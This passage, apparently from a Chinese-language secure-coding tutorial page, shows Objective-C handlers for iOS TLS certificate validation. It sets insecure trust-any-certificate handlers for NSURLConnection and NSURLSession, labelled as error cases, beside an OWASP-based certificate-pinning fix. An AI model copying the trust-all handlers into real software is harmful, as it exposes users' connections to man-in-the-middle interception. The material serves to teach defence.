&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;continueWithoutCredentialForAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;上面的做法會讓使用 NSURLConnection 的連線略過憑證檢查，容許任意憑證通過。下面節錄 OWASP WIKI 上的範例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autorelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;UInt8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetBytePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSUInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;random-org&amp;quot;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;der&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// The only good exit point&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;                         &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;44&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;45&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// Bad dog&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;46&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;cancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;處理方式與前面的 Android 情況2類同，做了 certificate pinning。&lt;/p&gt;

&lt;h4 id=&quot;ios-錯誤處理情況3&quot;&gt;iOS 錯誤處理情況3&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;completionHandler:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;                               &lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;bp&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

